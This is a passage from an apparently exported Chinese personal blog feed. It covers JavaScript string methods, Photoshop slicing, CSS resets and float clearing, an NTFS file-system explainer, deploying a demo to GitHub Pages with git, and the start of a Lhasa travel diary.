&quot;|a|b|c&quot;.split(&quot;|&quot;) // 将返回 [&quot;&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;] 截取字符串 substringsubstring() 方法用于提取字符串中介于两个指定下标之间的字符。语法：str.substring(indexStart, [indexEnd]) var str = &apos;Hello World!&apos;; console.log(str.substring(3)); // 将返回 lo world! 字符串转换大写 toUpperCase()toUpperCase() 方法用于把字符串转换为大写。 var str = &apos;Hello World!&apos;; console.log(str.toUpperCase()); // 将返回 HELLO WORLD! 题目完善函数 convertToCamelCase 的功能。函数 convertToCamelCase 会转换传入的字符串参数 string 为驼峰格式，并返回转换后的字符串。具体要求如下： 参数 string 是以中划线（-）连接单词的字符串，需将第二个起的非空单词首字母转为大写，如 -webkit-border-radius 转换后的结果为 webkitBorderRadius。 返回转换后的字符串 解决方法： function convertToCamelCase(str){ var strSplit = str.split(&quot;-&quot;);//转换为字符串数组 if(strSplit[0] === &quot;&quot;){ //如果第一个字符串为空的话，左移删掉，否则的话不变 strSplit.shift(); } for(var i = 1; i &lt; strSplit.length; i++){ var letter = strSplit[i].charAt(0);//取得字符串数组中每个字符串的首字母 //使用replace方法将每个字符串的首写字母大写 strSplit[i] = strSplit[i].replace(letter, function replace(letter){ return letter.toUpperCase(); }); } return strSplit.join(&quot;&quot;);//join方法串接起字符串 } convertToCamelCase(&quot;-ni-hao-a&quot;); 还可以使用正则表达式的方法。 function convertToCamelCase(str) { return str.replace(/\-[a-z]/g , function(a, b){ return b == 0 ? a.replace(&apos;-&apos;,&apos;&apos;) : a.replace(&apos;-&apos;,&apos;&apos;).toUpperCase(); }); }]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PS切图笔记from慕课网]]></title>
    <url>%2F2017%2F10%2F18%2FPS%E5%88%87%E5%9B%BE%E7%AC%94%E8%AE%B0-ing%2F</url>
    <content type="text"><![CDATA[在慕课网学习的简单的关于PS切图的基本使用。下面是慕课网的视频学习链接前端工程师必备的PS技能——切图篇。 Photoshop界面设置使用的photoshop版本为photoshop cc 2015。 新建设置文件–&gt;新建–&gt;文档类型（自定）–&gt;宽度一般固定（1920像素）–&gt;高度一般不定(此时设为2000像素)–&gt;分辨率72像素/英寸–&gt;背景内容(透明)。 再点击“确定”即可生成一张新的界面。此时还可点击“存储预设为”将本次自定义设置预设，留作以后使用该设置参数时使用。参数设置即生成图片分别为下列两图所示。 不知道是不是我下载的破解版的原因，键盘在中文输入法状态下时，左侧导航栏的工具图标不显示提示名称，切换到英文输入状态时就会显示。。 移动工具设置第一个工具图标为：移动工具，快捷键V。 如下图所示。 选择移动工具–不勾选自动选择–选择图层–按住ctrl+鼠标左键可以自由选择想要的图层，会在右侧图层显示信息栏为你筛选出当前鼠标左键选择的图层。如下图所示。 视图设置勾选两个功能：（1）视图–&gt;显示–&gt;智能参考线 （2）视图–&gt;标尺可以在窗口–&gt;库，颜色，路径，通道， 把这几个功能关掉。 窗口–&gt;历史记录，信息，图层，三个功能模块打开。 最后在右侧区域一共用到四个功能，即信息，字符，图层，历史纪录。见下图。 信息面板设置如下： 在编辑–&gt;首选项–&gt;单位与标尺，将单位改为像素。 Photoshop基本操作]]></content>
      <categories>
        <category>PS</category>
      </categories>
      <tags>
        <tag>PS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有默认margin，padding值的html标签]]></title>
    <url>%2F2017%2F10%2F18%2F%E9%BB%98%E8%AE%A4margin%E5%80%BC%E5%85%83%E7%B4%A0%2F</url>
    <content type="text"><![CDATA[总结一下那些有默认margin及padding值的html标签，在CSS reset时，最好将这些元素的padding和margin值初始化为0，以实现不同浏览器下的样式兼容，避免后期团队开发过程因不同浏览器下默认样式不同而造成混乱。 h1~h6标签有默认margin（top,bottom且相同）值，没有默认padding值。 在chrome中：16,15,14,16,17,19; 在firefox中：16,15,14,16,17,20; 在safari中：16,15,14,16,17,19; 在opera中：16,15,14,14,17,21; 在maxthon中：16,14,14,15,16,18; 在IE6.0中：都是19； 在IE7.0中：都是19； 在IE8.0中：16,15,14,16,17,19; dl标签有默认margin（top,bottom且相同）值，没有默认padding值。 在Chrome,Firefox,Safari,Opera,Maxthon,IE8.0中：margin:12px 0px; 在IE6.0,7.0中：margin:19px 0px; dd标签有默认margin-left：40px;(在所有上述浏览器中)。 ol,ul标签有默认margin-（top,bottom且相同）值，有默认padding-left值 在Chrome,Firefox,Safari,Opera,Maxthon,IE8.0中：margin:12px 0px; 在IE6.0,7.0中：margin:19px 0px; 默认padding-left值：在Chrome,Firefox,Safari,Opera,Maxthon,IE8.0中都是padding-left：40px;在IE6.0,7.0中没有默认padding值，因为ol,ul标签的边框不包含序号。 th,td标签th,td标签没有默认的margin值，有默认的padding值。 在Chrome,Firefox,Safari,Opera,Maxthon中：padding：1px; 在IE8.0中：padding：0px 1px 1px; 在IE7.0中：padding：0px 1px； 相同内容th的宽度要比td宽，因为th字体有加粗效果。 注意 ：table标签没有默认的margin,padding值。 form标签form标签在Chrome,Firefox,Safari,Opera,Maxthon,IE8.0中没有默认的margin,padding值，但在IE6.0,7.0中有默认的margin：19px 0px; p标签p标签有默认margin(top,bottom)值,没有默认padding值。 在Chrome,Firefox,Safari,Opera,Maxthon,IE8.0中：margin:12px 0px; 在IE6.0,7.0中：margin:19px 0px; textarea标签textarea标签在上述所有浏览器中：margin:2px；padding:2px； select标签select标签在Chrome,Safari,Maxthon中有默认的margin：2px；在Opera,Firefox,IE6.0,7.0,8.0没有默认的margin值。 option标签option标签只有在firefox中有默认的padding-left：3px； CSS reset/*CSS style init*/ body,ul,ol,dl,dd,h1,h2,h3,h4,h5,h6,p,input,select,option,textarea,form,th,td{margin: 0; padding: 0;} body{font:14px/1.5 &quot;宋体&quot;;} img{border:none;} li{list-style:none;} input,select,textarea{outline:none;border:none;background:none;} textarea{resize:none;} a{text-decoration:none;}]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS清除浮动的几种方法]]></title>
    <url>%2F2017%2F10%2F17%2Fclearfix%2F</url>
    <content type="text"><![CDATA[几种定位方式，以及CSS清除浮动的几种方法。 几种定位方式普通流定位 static普通流定位即文档流定位，是页面元素的默认定位方式。按照元素在文档流中的出现顺序以默认形式呈现元素。 页面中的块级元素：按照从上到下的方式逐个排列 。 页面中的行内元素：按照从左到右的方式逐个排列 。 此时考虑如何让多个块级元素显示在一行，就引出了浮动的概念。 浮动定位 floatfloat属性取值为 left/right。这个属性原本不是用来布局的，而是用来做文字环绕的，但是后来人们发现做布局也不错，就一直这么用了，甚至有些时候都忘了用他做文字环绕。 相对定位 relative元素会相对于它原来的位置偏移某个距离。使元素偏离原来位置后，元素原本的空间依然会被保留。 语法 属性：position 取值：relative 再配合 偏移属性top/right/bottom/left实现位置改变 绝对定位 absolute若元素被设置为绝对定位，具备以下几个特征： 1、脱离文档流-不占据页面空间 2、通过偏移属性固定元素位置 3、相对于 最近的已定位的祖先元素实现位置固定 4、如果没有已定位祖先元素，那么就相对于最初的包含块(body,html)去实现位置的固定 语法 属性：position 取值：absolute 再配合 偏移属性(top/right/bottom/left)实现位置的固定 固定定位 fixed将元素固定在页面的某个位置处，不会随着滚动条而发生位置移动。 语法 属性：position 取值：fixed 配合着 偏移属性(top/right/bottom/left)实现位置的固定 浮动的效果1、浮动定位元素会被排除在文档流之外-脱离文档流(不占据页面空间),其余的元素要上前补位 2、浮动元素会停靠在父元素的左边或右边，或停靠在其他已浮动元素的边缘上(元素只能在当前所在行浮动) 3、浮动元素依然位于父元素之内 4、浮动元素处理的问题-解决多个块级元素在一行内显示的问题 注意 1、一行内，显示不下所有的已浮动元素时，最后一个将换行 2、元素一旦浮动起来之后，那么宽度将变成自适应(宽度由内容决定) 3、元素一旦浮动起来之后，那么就将变成块级元素,尤其对行内元素，影响最大（块级元素：允许修改尺寸；行内元素：不允许修改尺寸 ） 4、文本，行内元素，行内块元素时采用环绕的方式来排列的，是不会被浮动元素压在底下的，会巧妙的避开浮动元素 浮动的影响：由于浮动元素会脱离文档流，所以导致不占据页面空间，所以会对父元素高度带来一定影响。如果一个元素中包含的元素全部是浮动元素，那么该元素高度将变成0（高度塌陷）。 清除浮动方法1直接设置父元素的高度。优势：极其简单；弊端：必须要知道父元素高度是多少 方法2在父元素中，追加空子元素，并设置其clear属性为both。clear是css中专用于清除浮动的属性。作用：清除当前元素前面的元素浮动所带来的影响 取值： 1、none 默认值，不做任何清除浮动的操作 2、left 清除前面元素左浮动带来的影响 3、right 清除前面元素右浮动带来的影响 4、both 清除前面元素所有浮动带来的影响 优势：代码量少 容易掌握 简单易懂弊端：会添加许多无意义的空标签，有违结构与表现的分离，不便于后期的维护 方法3设置父元素浮动。 优势：简单，代码量少，没有结构和语义化问题；弊端：对后续元素会有影响 方法4为父元素设置overflow属性。 取值：hidden 或 auto 优势：简单，代码量少弊端：如果有内容要溢出显示(弹出菜单)，也会被一同隐藏 方法5父元素设置display:table. 优势：不影响结构与表现的分离，语义化正确，代码量少；弊端：盒模型属性已经改变，会造成其他问题 方法6使用内容生成的方式清除浮动。 .clearfix:after { content:&quot;&quot;; display:block; clear:both; } :after 选择器向选定的元素之后插入内容 content:&quot;&quot;; 生成内容为空 display: block; 生成的元素以块级元素显示, clear:both; 清除前面元素浮动带来的影响 相对于空标签闭合浮动的方法，优势：不破坏文档结构，没有副作用；弊端：代码量多 方法7.cf:before,.cf:after { content:&quot;&quot;; display:table; } .cf:after { clear:both; } 优势：不破坏文档结构，没有副作用；弊端： 代码量多]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NTFS文件系统介绍]]></title>
    <url>%2F2017%2F10%2F16%2FNTFS-file-system%2F</url>
    <content type="text"><![CDATA[【转】Windows文件系统FAT16、FAT32、NTFS的简单介绍。 什么是NTFS文件系统介绍NTFS之前，先来介绍一下FAT。 FAT(File Allocation Table)表示“文件分配表”，它的意义在于对硬盘分区的管理。FAT16、FAT32、NTFS是Windows系统最常见的三种文件系统。 FAT16：以前用的DOS、Windows95都使用FAT16文件系统，后来的Windows98/2000/XP等系统均支持FAT16文件系统。它最大可以管理大到2GB的分区，但每个分区最多只能有65525个簇（簇是磁盘空间的配置单位，即文件的存取的最小单位，一个簇包含若干扇区，而扇区是磁盘驱动器向磁盘读取和写入数据的最小单位）。随着硬盘或分区容量的增大，每个簇所占的空间将越来越大，从而导致硬盘空间的浪费。 更多关于硬盘的基本知识参见博客硬盘基本知识。 FAT32：随着大容量硬盘的出现，从Windows98开始，FAT32开始流行。它是FAT16的增强版本，可以支持大到2TB（2048GB)的分区。FAT32使用的簇比FAT16小，从而有效地节约了硬盘空间。 NTFS：微软Windows NT内核的系列操作系统支持的、一个特别为网络和磁盘配额、文件加密等管理安全特性设计的磁盘格式。从1993年开始，随着以NT为内核的Windows 2000/XP的普及，很多个人用户开始用到了NTFS。NTFS也是以簇为单位来存储数据文件，但NTFS中簇的大小并不依赖于磁盘或分区的大小。簇尺寸的缩小不但降低了磁盘空间的浪费，还减少了产生磁盘碎片的可能。NTFS支持文件加密管理功能，可为用户提供更高层次的安全保证。 在NTFS文件系统中，文件存取是按簇进行分配，一个簇必需是物理扇区的整数倍，而且总是2的整数次方倍。NTFS文件系统并不去关心什么是扇区，也不会去关心扇区到底有多大（如是不是512字节）。簇大小在使用格式化程序时则会由格式化程序根据卷大小自动的进行分配。 文件通过主文件表（MFT）来确定其在磁盘上的存储位置。主文件表是一个对应的数据库，由一系列的文件记录组成。 卷中每一个文件都有一个文件记录（对于大型文件还可能有多个记录与之相对应）。主文件表本身也有它自己的文件记录。 NTFS卷上的每个文件都有一个64 bit称为文件引用号（File Reference Number，也称文件索引号）的唯一标识。文件引用号由两部分组成：一是文件号，二是文件顺序号。文件号为48位，对应于该文件在MFT中的位置。文件顺序号随着每次文件记录的重用而增加，这是为NTFS进行内部一致性检查而设计的。 NTFS使用逻辑簇号（Logical Cluster Number，LCN）和虚拟簇号（Virtual Cluster Number，VCN）来进行簇的定位。LCN是对整个卷中所有的簇从头到尾所进行的简单编号。卷因子乘以LCN，NTFS就能够得到卷上的物理字节偏移量，从而得到物理磁盘地址。VCN则是对属于特定文件的簇从头到尾进行编号，以便于引用文件中的数据。VCN可以映射成LCN，而不必要求在物理上连续。 NTFS的目录只是一个简单的文件名和文件引用号的索引，如果目录的属性列表小于一个记录的长度，那么该目录的所有信息都存储在主文件表的记录中，对于大于记录的目录则使用B+树进行管理。 主文件表中的基本文件记录中有一个指针指向一个存储非常驻索引缓冲–包括该目录下所有下一级子目录和文件的外部簇，而B+树结构便于大型目录中文件和子目录的快速查找。 在NTFS中，所有存储在卷上的数据都包含在文件中，包括用来定位和获取文件的数据结构，以及引导程序和记录这个卷的记录（NTFS元数据）的位图，这体现了NTFS的原则：磁盘上的任何事物都为文件。在文件中存储一切使得文件系统很容易定位和维护数据，而在NTFS中，卷中所有存放的数据均在一个叫做MFT的文件记录数组中，称为主文件表(Master File Table)，MFT是由高级格式化产生的。而MFT则由文件记录(File Record)数组构成。File Record的大小一般是固定的，不管簇的大小是多少，均为1KB，这个概念相当于Linux中的inode（i节点）。File Record在MFT文件记录数组中物理上是连续的，且从0开始编号。 MFT仅供系统本身组织、架构文件系统使用，这在NTFS中称为元数据(metadata)。其中最基本的前16个记录是操作系统使用的非常重要的元数据文件。这些NTFS主文件表的重要的元数据文件都是以$(美元符号)开始的名字，所以是隐藏文件，在Windows 2000中不能使用dir命令(甚至加上/ah参数)像普通文件一样列出这些元数据文件。实际上File System Driver(ntfs.sys)维护了一个系统变量NTFS Protect System Files用于隐藏这些元数据。但是微软公司也提供了一个OEM TOOL,叫做NFI.EXE,用此工具可以转储NTFS主文件表的重要的元数据文件（元数据：是存储在卷上支持文件系统格式管理的数据。它不能被应用程序来访问，它只能为系统提供服务）。这些元数据文件文件是系统驱动程序装配卷所必需的，WINDOWS 2000给每个分区赋予一个盘符并不表示该分区包含有WINDOWS 2000可以识别的文件系统格式，如果一旦主文件表损坏，那么该分区在WINDOWS 2000下是无法读取的。为了使该分区能够在WINDOWS 2000下能被识别，也就是必须首先建立WINDOWS 2000可以识别的文件系统格式即主文件表，这可通过高级格式化该分区来完成。众所周知，Windows以簇号来定位文件在磁盘存储的位置，在FAT格式的文件系统中有关簇号的指针是包含在FAT表中的，而在NTFS中有关簇号的指针是包含在$MFT及$MFTMirr文件中的。 NTFS元文件MFT中的第1个记录就是MFT自身。由于MFT文件本身的重要性，为了确保文件系统结构的可靠性，系统专门为它准备了一个镜像文件（＄MftMirr），也就是MFT中的第2个记录。 第3个记录是日志文件（＄LogFile）。该文件是NTFS为实现可恢复性和安全性而设计的。当系统运行时，NTFS就会在日志文件中记录所有影响NTFS卷结构的操作，包括文件的创建和改变目录结构的命令，例如复制，从而在系统失败时能够恢复NTFS卷。 第4个记录是卷文件（＄Volume），它包含了卷名、被格式化的卷的NTFS版本和一个标明该磁盘是否损坏的标志位（NTFS系统以此决定是否需要调用Chkdsk程序来进行修复）。 第5个记录是属性定义表（＄AttrDef，attribute definition table），其中存放了卷所支持的所有文件属性，并指出它们是否可以被索引和恢复等。 第6个记录是根目录（\），其中保存了存放于该卷根目录下所有文件和目录的索引。在访问了一个文件后，NTFS就保留该文件的MFT引用，第二次就能够直接进行对该文件的访问。 第7个记录是位图文件（＄Bitmap）。NTFS卷的分配状态都存放在位图文件中，其中每一位（bit）代表卷中的一簇，标识该簇是空闲的还是已被分配了的，由于该文件可以很容易的被扩大，所以NTFS的卷可以很方便的动态的扩大，而FAT格式的文件系统由于涉及到FAT表的变化，所以不能随意的对分区大小进行调整。 第8个记录是引导文件（＄Boot），它是另一个重要的系统文件，存放着Windows 2000/XP的引导程序代码。该文件必须位于特定的磁盘位置才能够正确地引导系统。该文件是在Format程序运行时创建的，这正体现了NTFS把磁盘上的所有事物都看成是文件的原则。这也意味着虽然该文件享受NTFS系统的各种安全保护，但还是可以通过普通的文件I/O操作来修改。 第9个记录是坏簇文件（＄BadClus），它记录了磁盘上该卷中所有的损坏的簇号，防止系统对其进行分配使用。 第10个记录是安全文件（＄Secure），它存储了整个卷的安全描述符数据库。NTFS文件和目录都有各自的安全描述符，为了节省空间，NTFS将具有相同描述符的文件和目录存放在一个公共文件中。 第11个记录为大写文件（＄UpCase，upper case file），该文件包含一个大小写字符转换表。 第12个记录是扩展元数据目录（＄Extended metadata directory）。 第13个记录是重解析点文件（$Extend\$Reparse）。 第14个记录是变更日志文件（$Extend\$UsnJrnl）。 第15个记录是配额管理文件（$Extend\$Quota）。 第16个记录是对象ID文件（$Extend\$ObjId）。 第17～23记录是是系统保留记录，用于将来扩展。 MFT的前16个元数据文件是如此重要，为了防止数据的丢失，NTFS系统在该卷文件存储部分的正中央对它们进行了备份。 NTFS把磁盘分成了两大部分，其中大约12%分配给了MFT，以满足其不断增长的文件数量。为了保持MFT元文件的连续性，MFT对这12%的空间享有独占权。余下的88%的空间被分配用来存储文件。而剩余磁盘空间则包含了所有的物理剩余空间–MFT剩余空间也包含在里面。MFT空间的使用机制可以这样来描述：当文件耗尽了存储空间时，Windows操作系统会简单地减少MFT空间，并把它分配给文件存储。当有剩余空间时，这些空间又会重新被划分给MFT。虽然系统尽力保持MFT空间的专用性，但是有时不得不做出牺牲。尽管MFT碎片有时是无法忍受的，却无法阻止它的发生。 那么NTFS到底是怎么通过MFT来访问卷的呢？首先，当NTFS访问某个卷时，它必须”装载”该卷：NTFS会查看引导文件（在图中的＄Boot元数据文件定义的文件），找到MFT的物理磁盘地址。然后它就从文件记录的数据属性中获得VCN到LCN的映射信息，并存储在内存中。这个映射信息定位了MFT的运行（run或extent）在磁盘上的位置。接着，NTFS再打开几个元数据文件的MFT记录，并打开这些文件。如有必要NTFS开始执行它的文件系统恢复操作。在NTFS打开了剩余的元数据文件后，用户就可以开始访问该卷了。 文件和目录记录NTFS将文件作为属性/属性值的集合来处理，这一点与其他文件系统不一样。文件数据就是未命名属性的值，其他文件属性包括文件名、文件拥有者、文件时间标记等。 每个属性由单个的流（stream）组成，即简单的字符队列。严格地说，NTFS并不对文件进行操作，而只是对属性流进行读写。NTFS提供对属性流的各种操作：创建、删除、读取（字节范围）以及写入（字节范围）。读写操作一般是针对文件的未命名属性的，对于已命名的属性则可以通过已命名的数据流句法来进行操作。 一个文件通常占用一个文件记录。然而，当一个文件具有很多项属性值或很零碎的时候，就可能需要占用一个以上的文件记录。这种情况下，第一个文件记录是其基本的文件记录，存储有该文件需要的其它文件记录的位置。小文件和文件夹（典型的如1500字节或更少）将全部存储在文件的MFT记录里。 文件夹记录包括索引信息，小文件夹记录完全存储在MFT结构内，然而大的文件夹则被组织成B+树结构，用一个指针指向一个外部簇，该簇用来存储那些MFT内存储不了的文件夹的属性。 NTFS卷上文件的常用属性列出如下（并不是所有文件都有所有这些属性）： （1）常驻属性与非常驻属性 当一个文件很小时，其所有属性和属性值可存放在MFT的文件记录中。当属性值能直接存放在MFT中时，该属性就称为常驻属性（resident attribute）。有些属性总是常驻的，这样NTFS才可以确定其他非常驻属性。例如，标准信息属性和根索引就总是常驻属性。 每个属性都是以一个标准头开始的，在头中包含该属性的信息和NTFS通常用来管理属性的信息。该头总是常驻的，并记录着属性值是否常驻、对于常驻属性，头中还包含着属性值的偏侈量和属性值的长度。 如果属性值能直接存放在MFT中，那么NTFS对它的访问时间就将大大缩短。NTFS只需访问磁盘一次，就可立即获得数据；而不必像FAT文件系统那样，先在FAT表中查找文件，再读出连续分配的单元，最后找到文件的数据。小文件或小目录的所有属性，均可以在MFT中常驻。小文件的未命名属性可以包括所有文件数据。 大文件或大目录的所有属性，就不可能都常驻在MFT中。如果一个属性（如文件数据属性）太大而不能存放在只有1KB的MFT文件记录中，那么NTFS将从MFT之外分配区域。这些区域通常称为一个运行（run）或一个盘区（extent），它们可用来存储属性值，如文件数据。如果以后属性值又增加，那么NTFS将会再分配一个运行，以便用来存储额外的数据。值存储在运行中而不是在MFT文件记录中的属性称为非常驻属性（nonresident attribute）。NTFS决定了一个属性是常驻还是非常驻的；而属性值的位置对访问它的进程而言是透明的。当一个属性为非常驻时，如大文件的数据，它的头部包含了NTFS需要在磁盘上定位该属性值的有关信息。 在标准属性中，只有可以增长的属性才是非常驻的。对文件来说，可增长的属性有数据、属性列表等。标准信息和文件名属性总是常驻的。 （2）MFT文件记录结构分析 主文件表MFT的文件记录由记录头和属性列表组成，由”FF FF FF FF”结束，一般大小为1K，或一个簇大小（这样一般就更大），记录头包括以下一些域： 每次记录被修改都将导致日志文件序列号$LogFile Sequence Number（LSN）发生变化。序列号Sequence Number（SN）用于记录主文件表记录被重复使用的次数。硬连接数Hard Link Count记录硬连接的数目，只出现在基本文件记录中。文件记录的实际长度是文件记录在磁盘上实际占用的字节空间。基本文件记录中的文件索引号，对于基本文件记录，其值为0，如果不为0，则是一个主文件表的文件索引号，指向所属的基本文件记录中的文件记录号，在基本文件记录中包含有扩展文件记录的信息，存储在”属性列表ATTRIBUTE_LIST”属性中。属性列表是可变长度区，以”FF FF FF FF”结束，对于1K长度的MFT记录，属性列表的起始偏移为0x30。]]></content>
      <categories>
        <category>文件系统</category>
      </categories>
      <tags>
        <tag>NTFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[慕课网七夕动画学习总结 + Github Pages展示]]></title>
    <url>%2F2017%2F09%2F29%2Fdemo-qixi%2F</url>
    <content type="text"><![CDATA[这段时间照着慕课网上的一个动画案例-H5+JS+CSS3实现七夕言情学习，并将学习的各部分的代码进行整合，最后将代码托管到github上，并通过github pages展示这个动画demo。一些地方自己修改以后没有老师的效果好，但这是自己第一个敲出来的前端小demo，成就感满满，哈哈。。。 关于动画案例里面用到一些jQuery和ajax相关的知识，由于自己学习js不久，很多深一点的概念理解不到位，比如一开始代码的封装和流程的编写，都是照葫芦画瓢，不是很理解，但是慢慢的看得多了，这个过程也就熟悉起来了。 页面布局部分比较容易理解，但是三个主题页面滚动起来最开始对自己还是有点难度。该案例很多部分都利用了CSS3的transform属性和animation属性。而且这个案例的思想是，把实现特定动作或者动能的代码封装起来，暴露一个接口出来，增强了安全性简化了编程过程。 具体的学习过程和用到的知识点，大家可以跟着H5+JS+CSS3实现七夕言情学习，边看边学的效果比抱着书一直看的效果要好一些。但js高级教程的基础必须打牢，很多师兄师姐给的建议，也是网上一些大佬的建议。 关于画面自己做的一点小改动，button的样式做了修改，并增加了链接到github仓库的logo（shirly与猫）,嘤嘤嘤。如下，左下角和右下角辣么一点点。 关于将页面搭建在github pages上关于动画制作的学习过程如果说困难和迷惑的话，那这最后一步展示在github pages上的过程，就应该是差点死在最后的1%上。在网上看了很多博客和教程，总会遇到很多小问题，无法显示自己在本地的效果。最后看到了这篇博客，【 js 工具 】如何在Github Pages搭建自己写的页面？，这篇博客对于利用github pages搭建自己写的网页描述很详细，从在github上建仓库，到github pages的设置，再到利用git命令克隆github上的仓库到本地，最后push到远程master分支上。 更多关于github的使用可参考Github 简明教程,其中讲解的git维护的本地仓库的工作流很清晰，对于我这个初步使用git的菜鸟十分友好。而且关于branch和更新与合并功能也讲的比较清楚。 本地仓库由git维护的“三棵树”组成。第一个是工作目录，使用$ git status可以查看，列出了当前目录下所有还未被git管理的文件，以及被git管理了且被修改过但还未添加（add）的文件，也即所有改动文件，用红色字体标出。如下所示，当我在本地仓库demo-qixi用$ git status命令查看后，可以看到红色文件均为未提交的。 第二个是暂存区（Index），它类似一个缓存区，临时保存你的改动。通过$ git add .命令添加当前目录下的所有文件和子目录到暂存区。注意.表示当前目录下的所有文件和子目录。也可以指定文件添加到暂存区，使用$ git add &lt;filename&gt;。如下使用$ git add .添加文件到暂存区： 此时我们再使用$ git status命令查看下工作目录，你会发现所有的文件都变绿了，这就表示这些文件已被添加到暂存区准备好被提交（commit）了。 第三个是HEAD，它指向你最后一次提交的结果。使用$ git commit -m &quot;代码提交说明信息&quot;命令，将暂存区最后一次添加更改情况提交到HEAD。如下所示。 上述“三棵树”的工作流程如下所示。 此时改动虽然已经提交到了HEAD，但是还没到远端仓库。使用$ git push命令将这些改动提交到远端仓库的default master分支。也可以使用$ git push origin master命令，把改动提交到master分支。可以把master换成自己想要推送的任何分支。 动画demo展示demo网页展示链接慕课七夕主题网页展示。 该动画demo在github上的代码仓库demo-qixi。 tips:在打开demo页面展示链接时，浏览器链接窗口出现提示“此页面上部分内容不安全，例如图像”，并且网页内容不能完整显示，我使用的firefox浏览器。如下所示， 原因是我们用来展示demo的github pages站点是使用https协议的安全站点，而demo中的一些图片链接是使用的http协议，浏览器不会渲染混合内容（即来自安全站点的不安全数据）。如果我们浏览https网页，浏览器会拒绝加载不安全的内容（例如这里的demo-qixi中图片使用的http协议），浏览器将向用户发出“此页面上部分内容不安全”的警告。可以参考这篇讲web安全的文章，绕过混合内容警告 - 在安全的页面加载不安全的内容。 解决办法：我用的火狐浏览器，点浏览器链接窗口左侧的黄色警告三角形-&gt;点右侧箭头显示连接细节-&gt;点暂时解除保护，就可以看到完整的动画demo了。 然后点击 Go!开始动画啦。。。。。。]]></content>
      <categories>
        <category>github</category>
      </categories>
      <tags>
        <tag>Animation</tag>
        <tag>Github Pages</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[匆匆拉萨之行]]></title>
    <url>%2F2017%2F09%2F13%2Ftour-lahsa%2F</url>
    <content type="text"><![CDATA[第一次尝试写游记，嗯，是在周老师的文艺熏陶之下，试着记录一哈，但愿最后读起来不是一篇作文的感觉 T T ~~真的太久没动手写点儿文字了，想当年语文也是考过140分的人呐 = = 哈哈哈哈哈哈哈哈哈 嗯，这一定会是一本气质爆炸的流水账，如此鼓励自己，就像拉萨的阳光和色彩，希望经得起时间，淡化模糊了的时候再来强化一遍，反正又不是背英语词汇书，不用每次拾起都abandon 哈哈哈 在被林子放鸽子（为了她的大好前程，以及许诺将来可以赚很多钱养我的情况下，对于她的这种抛弃我的行为予以了包容，哈哈哈，我就是这么体贴大方聪明美丽可爱。。。。。。然而，在她晓得我自己去耍，她却在加班以后，果断从内疚的心态转为了说我抛弃了她==），又不想回家监督老弟学习，团队的小伙伴接连回家只剩我自己的情况下，突然萌生了想去远一点的地方这个想法，其实之前也有想过去趟拉萨，但是纠结于各种原因，一直没有付出行动。 从打算去拉萨，到最后决定并买票只花了一天时间，这是第一次去一个远一点的地方没有攻略过就这么仓促决定了。去的火车票没有，只好买机票，回程的也没有直达的火车票了，机票略贵不舍，只好坐着火车出拉萨到西宁再转车，真是一次相当难忘的硬座经历。虽然匆匆忙忙腿脚肿胀，但遇到些有趣的人始终是种新鲜。 Day 1 贡嘎机场外连绵的山，云彩触手可及的感觉，很凉爽，不过光秃秃的山还是有点荒凉，阳光很炫 停放机场大巴的车站，一出门就被这片云吸引到了，坐在旁边的叔叔说拉萨比这漂亮的云很多，这个太一般了，他们已经习惯了这片土地的蓝天和云，而我这个刚刚落地的游客真的十分激动哇，嘤嘤嘤，超爱高原上的感觉，怎么形容呢，就是会心情变得超级好，好心情养成地啊 来之前准备了红景天，由于时间仓促只提前喝了一天，然而下飞机之后感觉自己一点高原反应都没有，默默地瞎激动，以为自己会是逃脱高反的那个例外，就像当初觉得自己也是那个会逃过警告的人，but，瞎激动的幸运之后高反是说来就来的，晚上头疼的睡不着。 Day 2红景天真特么不管用，第二天头疼头晕还是躺了大半天，还不如连喝几壶热水管用，必须要赞一下的是，本来带的防感冒的药吃了一片居然有治头疼的奇效，在感冒药的助攻下，晕晕乎乎吃了一顿串串。夏天拉萨夜晚的街头很是凉快，于是决定去布宫广场转转。夜晚吃饱了坐在电瓶车上吹着凉风浪荡在一座陌生城市的感觉，贼爽。 傍晚酒店对面的拉萨河，高山和低垂的白云环抱一整座城市。 布宫广场上一对拍婚纱照的恋人。想起回程的火车上遇到的一个妹子，她说起登珠峰途中遇到的一对六十多岁的爷爷奶奶，爷爷说，只有去过珠峰的爱情才是真的爱情。这种高调的秀恩爱的方式，真的很动人。在高海拔缺氧的环境下，我与你一起经历头晕和窒息，一起经受岁月无情的摧残。 Day 3 从这顿早饭开始体验到拉萨的物价之高，这样的包子在我高反胃口不好的情况下，吃了六个还不饱，一块五一个。原来我也可以是一个早饭能吃十几块钱包子的人= = 去的时候正好赶上拉萨的雪顿节，雪顿节又叫酸奶节，他们告诉我说是专门喝酸奶的节日，我觉得是在糊弄我，但我对西藏节日文化也没甚了解，不甚感兴趣，也没去深究。但雪顿节的林卡气氛我是感受到了，比我们春节似乎还要热闹。整个就是全家集体公园春游的感觉。 罗布林卡草地上到处都是来过林卡的藏民，一家人围坐在坐席上，带上酸奶，带上酥油茶，带上不远赶来的美好愿景。 喜欢拉萨的色彩，尤其这种对比强烈的红色和黄色，蓝天，白云，一切都很美丽。 Day 4 波林卡路措姆凉粉店的菜单，排队的人超级多。字很秀气。 点了酸奶，土豆，凉粉。酸奶超级喜欢，加了一勺白砂糖，还有点酸。 布宫的一角，就像童话里的一座宫殿。能想象到历史上权利曾在此集中过。宫殿上方的阳光，明亮刺眼，你只能仰视它，它离你那么近那么远。 龙王潭公园的树荫下看到的布宫背面。布宫真的是360度无死角的美丽。不知道为什么，就是感觉阳光映照下，这片绿很可口的样子，看起来真的很好吃的样子啊。 阳光穿过树隙。这株柳树目测应该几百年历史了，在高原长这么粗壮，它一定经历和见证了很多。 Day 